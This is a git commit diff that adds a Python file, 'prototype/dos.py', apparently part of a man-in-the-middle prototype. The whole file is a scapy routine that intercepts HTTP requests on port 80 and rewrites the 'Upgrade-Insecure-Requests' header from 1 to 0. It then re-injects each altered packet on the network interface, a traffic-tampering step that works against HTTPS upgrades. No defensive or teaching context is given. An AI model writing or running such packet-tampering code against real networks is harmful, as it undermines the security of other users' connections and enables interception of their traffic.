5182b10c2a3a6a90301a275b14570bfccbc64f67
Reece <reece.mirv@gmail.com>
2024-10-23 11:37:32 -0500

    Added dos.py file

---
+++ prototype/dos.py
@@ -0,0 +1,27 @@
+from scapy.all import Ether, TCP, Raw, sendp
+from networking import *
+
+def dos(packet):
+    try:
+        gateway_ip = get_default_gateway_ip()
+        gateway_mac = get_mac_address(gateway_ip)
+
+        # if TCP in packet and packet[TCP].dport == 80 and "Upgrade-Insecure-Requests" in str(packet[Raw].load) and packet[Ether].dst == gateway_mac:
+        if TCP in packet and packet[TCP].dport == 80 and "Upgrade-Insecure-Requests" in str(packet[Raw].load):
+            decoded_prl = packet[Raw].load.decode()
+            new_prl = decoded_prl.replace("Upgrade-Insecure-Requests: 1", "Upgrade-Insecure-Requests: 0")
+
+            new_prl_encoded = new_prl.encode()
+            packet[Raw].load = new_prl_encoded
+
+            print("Raw_Packet", packet[Raw].load)
+
+            try:
+                sendp(packet, iface="eth0")
+            except:
+                print("Failed to send packet...")
+
+        # ? TODO If SRC == default_gateway then replace ack 0 with 1?
+
+    except:
+        pass
